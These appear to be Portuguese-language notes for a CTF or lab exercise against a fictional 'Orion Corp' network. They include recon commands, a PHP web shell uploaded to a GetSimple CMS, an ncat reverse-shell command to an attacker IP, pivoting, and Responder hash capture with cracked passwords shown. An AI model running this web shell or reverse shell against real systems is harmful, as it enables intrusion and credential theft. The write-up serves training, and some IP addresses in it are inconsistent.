__________
## `Evidência 01`
* Iniciei realizando um recon para encontrar portas/serviços abertas no host.

```go
nmap -V -sS --oprn -p- 172.23.1.40

```

![[recon-portas-nmap-orions-corp.png]]

* Paralelamente, realizei um brute-force de diretório que nos retornou  2 diretórios exporto (http://172.23.1.40/adm/  e http://172.23.1.40/javascript// ) .

```go
	Gobuster dir --url http://172.16.1.40:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/
	
	```

- Apos isso realizei mais brute-force, mas agora focado no diretório http://172.23.1.40/adm/ encontrado anteriormente, possibilitando encontrar outros diretórios exporto . 

```go
Gobuster dir --url http://172.16.1.40:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt
```


![[brute-force-dir-Orions-corp.png]]

- Verificando todos os diretórios, encontrei um usuário e a hash no diretório http://172.23.1.40/adm/data/users/admin.xml 

![[file_xml_hash_usuario_Orions-corp.png]]

- Usando o site https://hashes.com para quebrar  essa hash encontrada anteriormente, descobrimos a senha de login desse usuário. 

![[hash_quebrada_orions_corp.png]]

- Apos obter o usuário `admin` e senha `admin123` do CMS(Getsimples), podemos usa-la para logar no painel administrativo.

![[painel-login-orions-corp.png]]

- Logado no ==cms==, iremos realizar o upload de um arquivo ==.phar== com um payload que nos possibilite obter uma reverse shell.
- Arquivo `shell.phar` com o payload abaixo:
```php
	<?php 
		system($_GET['cmd']);
	 ?>
```


![[centro-administrativo-cms-orionscorp.png]]


- Próximo passo e executar nosso payload para obtenção da shell. 
- executando o arquivo, podemos executar comandos via parâmetro ==cmd== no navegador.
- Agora que conseguimos executar comandos via parâmetro, iremos executar reverse shell usando o ==netcat==.
- 
```php
	172.23.1.40/adm/admin/data/uploads/shell.phar?cmd=ncat     172.23.10.165 4444 -e sh
```


![[exec-payload-url-orionscorp.png]]
![[shell_reverse_Orions_corp.png]]


- Ao  conseguir acesso ao servidor, podemos dar um ==cd /== para obter a flag na raiz do sistema

![[evidencia-01-Orions-corp.png]]

## `Evidência 02`
- A Orion Corp tem outros hosts na rede interna. Foi possível identificar os IPs ativos no segmento de rede interno.
- Executando o comando:
	-->	`ip route`  
- identificamos uma segunda interface de rede `172.23.2.0/24` dev `ens224`.
  
![[segunda-interface_rede-Orions-corp.png]]
-  Embora não seja possível, em um primeiro momento, estabelecer comunicação direta com a segunda rede, devido ao fato de o acesso inicial estar restrito ao host **172.23.1.40**, esse ponto de entrada pode ser explorado estrategicamente. A partir dele, torna-se viável implementar técnicas de **pivoting**, permitindo o encaminhamento de tráfego e, consequentemente, a interação com a outra interface de rede anteriormente inacessível.
- Usando a ferramenta `ligolo-ng` criaremos um rota de trafego que permita a interação entre meu host e a segunda rede que se comunica com o host `172.23.1.40`.
- Link:
	[[1 - Como usar o Ligolo]]
	
-  Apos configura tudo e estabelecer comunicação com a rede alvo, iremos executar o script:
```shell
#!/bin/bash
for i in {1..254}; do
    ip="172.23.1.$i"
    if timeout 0.5 ping -c 1 -W 1 "$ip" &>/dev/null; then
        echo "Host ativo: $ip"
        echo "$ip" >> up.txt
    fi
done

echo "Varredura concluída."

```

![[script-scan-ativos-Orions-corp.png]]
![[ping-scan-ativos-Orions-corp.png]]
- finalizado a execução dos script encontramos os host ativos na segunda interface de rede:
`	172.16.2.30
	`172.16.2.243
	`172.16.2.245
	`172.16.2.253

- os host que nos interessa são apenas os finas ==.243,.245== e ==.253==
que e nossa evidencia `02`.

![[script-scan-ativos-resultado-Orions-corp.png]]

## `Evidência 03`

> [!Objetivo]
> A Orion Corp precisa confirmar se há hashes sensíveis trafegando na rede. Foi possível capturar hashes de usuários no ambiente? Informe os nomes dos usuários cujos hashes foram capturados para pontuar. (em ordem alfabética separados por vírgula)

- Com o acesso ao cms iremos enviar a ferramenta Responder.py para o diretório `/temp` para capturar a hashes que trafegam na rede, mas para que o responder.py funcione nesse ambiente e necessário usar uma versão especifica da ferramenta.
- Pegue a versão 3.1.5.0 na lista de releases do github: https://github.com/lgandx/Responder/releases/tag/v3.1.5.0.

- suba um `servidor python` na sua maquina:
```python
	  python3 -m http.server 8000
```
- Na maquina vitima use o `wget` para realizar o download do arquivos:
```shell
	 wget http://seu-ip:porta-servidor-python/responder
```

- Observação, antes de subir a ferramentas, vamos configura-la para que funcione corretamente.
	- Edite o arquivo `responder.conf` desabilitando algumas opções necessário para esse laboratório, como mostrado na imagem abaixo:

![[Responder_Orions corp.png]]
- Alem disso, devemos adicionar nas configurações os ips encontrados anteriormente na `interface enss224`. 
- ips:
	`172.16.2.243
	`172.16.2.245
	`172.16.2.253
- apos realizar todas configuration e subir o responder, pode dar permissão para ferramenta com `chmod 777 responder.py` e dar run na ferramenta:
	```python3 responder.py -I ens224 -wd -v```

![[Responder_Orions -hashe.png]]
-  Ao finalizar a captura das hashes na rede, salvamos em um arquivos e usamos as ferramentas ==**john**== ou ==**hashcat**== para quebrar as hashes, como mostrado a esquerda na captura de tela.
	-  `evidencia 03` encontrada, usuários: --__ccesar,pvitor__ e quebrando suas hashes encontramos a `evidencia 04`: **xxxleo#|,04T905#|**.
	
![[Responder_Orions -hashe-quebradas.png]]
## `Evidência 05



![[evidencia07-hashes-orions-corp.png]]
![[evidencia08-key-orions-corp.png]]



















![[evidencia08-key-orions-corp.png]]








![[evidencia08-key-orions-corp.png]]


![[binario_privesc_Orions-corp.png]]


![[Binario-priviesc-Orions-corp.png]]








![[privesc-orions-corp.png]]










